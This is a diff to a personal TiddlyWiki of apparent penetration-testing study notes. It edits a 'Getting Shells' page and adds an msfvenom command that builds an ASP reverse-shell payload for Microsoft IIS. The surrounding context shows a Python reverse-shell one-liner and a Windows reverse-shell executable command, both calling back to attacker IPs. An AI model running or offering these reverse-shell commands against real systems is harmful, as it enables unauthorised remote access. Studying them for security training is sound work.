@@ -10065,7 +10065,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211107040111810" list="Tech Operations/IT [[Cyber Security]] Pivoting CrappyMakerProgrammer" modified="20211107085732629" title="$:/StoryList">
+<div created="20211107040111810" list="Tech Operations/IT [[Cyber Security]] [[Getting Shells]] Pivoting CrappyMakerProgrammer" modified="20211107134240337" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -12094,7 +12094,7 @@ Most popular Game Engines
 
 </pre>
 </div>
-<div created="20210901154708454" modified="20211106024912704" title="Getting Shells">
+<div created="20210901154708454" modified="20211107134330071" title="Getting Shells">
 <pre>! SSH Keys
 
 From https://mqt.gitbook.io/oscp-notes/ssh-keys
@@ -12129,6 +12129,13 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe
 ```
+
+for Microsoft IIS, 
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.133 LPORT=4444 -f asp &gt; evil.asp  
+```
+
 
 !! Connecting
 
